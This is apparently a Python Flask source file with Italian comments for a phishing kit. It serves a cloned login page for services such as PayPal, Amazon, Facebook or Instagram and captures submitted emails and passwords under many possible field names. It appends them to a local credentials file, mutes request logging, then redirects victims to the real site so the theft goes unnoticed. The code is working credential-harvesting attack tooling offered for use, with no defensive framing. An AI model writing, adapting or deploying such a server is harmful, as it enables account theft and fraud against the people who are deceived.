import os
from flask import Flask, render_template, request, redirect

app = Flask(__name__)

# Riduci il verbo di logging delle richieste (werkzeug) per non mostrare GET/POST nel terminale
import logging
logging.getLogger('werkzeug').setLevel(logging.ERROR)
app.logger.setLevel(logging.ERROR)

# Legge configurazione da variabili d'ambiente (impostate dallo script bash)
TEMPLATE_NAME = os.environ.get('TEMPLATE_NAME')

# Se non è stata fornita via env, proviamo a scegliere il primo template
if not TEMPLATE_NAME:
    templates_dir = os.path.join(os.path.dirname(__file__), 'templates')
    try:
        files = sorted([f for f in os.listdir(templates_dir) if f.lower().endswith('.html')])
    except Exception:
        files = []
    if files:
        TEMPLATE_NAME = files[0]
    else:
        raise SystemExit('Nessun template trovato e TEMPLATE_NAME non impostato')

# Deriva il nome del sito dalla template (es. paypal.html -> paypal)
site_base = os.path.splitext(os.path.basename(TEMPLATE_NAME))[0]

CREDENTIALS_FILE = os.environ.get('CREDENTIALS_FILE', os.path.join('credenziali', f'Credenziali_{site_base}.txt'))

# Log the selected template for debugging and expose a small endpoint to inspect it
app.logger.info('Selected TEMPLATE_NAME: %s', TEMPLATE_NAME)



# Mappa semplice per redirect di default quando non fornito
default_redirects = {
    'amazon': 'https://www.amazon.com',
    'facebook': 'https://www.facebook.com',
    'insta': 'https://www.instagram.com',
    'instagram': 'https://www.instagram.com',
    'paypal': 'https://www.paypal.com'
}
REDIRECT_URL = os.environ.get('REDIRECT_URL', default_redirects.get(site_base.lower(), 'https://www.google.com'))

@app.route('/')
def index():
    # Renderizza il template scelto (deve trovarsi nella cartella templates/)
    return render_template(TEMPLATE_NAME)


@app.route('/__selected')
def selected():
    # Endpoint di debug: restituisce il nome del template attualmente usato
    return {'template': TEMPLATE_NAME}

@app.route('/login', methods=['GET', 'POST'])
def login():
    # Supporta POST (quando il form invia) e GET (evita 405 se qualcosa fa una GET su /login)
    if request.method == 'POST':
        # Proviamo più nomi possibili per email/username e password per maggiore robustezza
        email = (
            request.form.get('email')
            or request.form.get('username')
            or request.form.get('login_email')
            or request.form.get('emailAddress')
            or request.form.get('user')
        )
        password = (
            request.form.get('pass')
            or request.form.get('password')
            or request.form.get('login_password')
            or request.form.get('pwd')
        )

        # Assicurati che la cartella per le credenziali esista
        creds_dir = os.path.dirname(CREDENTIALS_FILE) or '.'
        if creds_dir and not os.path.exists(creds_dir):
            try:
                os.makedirs(creds_dir, exist_ok=True)
            except Exception:
                pass

        # Scrive le credenziali nel file configurato se almeno un campo è presente
        if (email is not None and email != '') or (password is not None and password != ''):
            try:
                with open(CREDENTIALS_FILE, 'a') as f:
                    f.write(f'Email/Telefono: {email}, Password: {password}\n')
                    f.flush()
            except Exception:
                app.logger.exception('Impossibile scrivere le credenziali su %s', CREDENTIALS_FILE)

    # In ogni caso reindirizza al sito reale configurato
    return redirect(REDIRECT_URL)

if __name__ == '__main__':
    # Porta fissa 5001 (lo script esterno si aspetta questa porta)
    # Disabilitiamo il debug mode per evitare ulteriori log verbosi
    app.run(debug=False, port=5001)
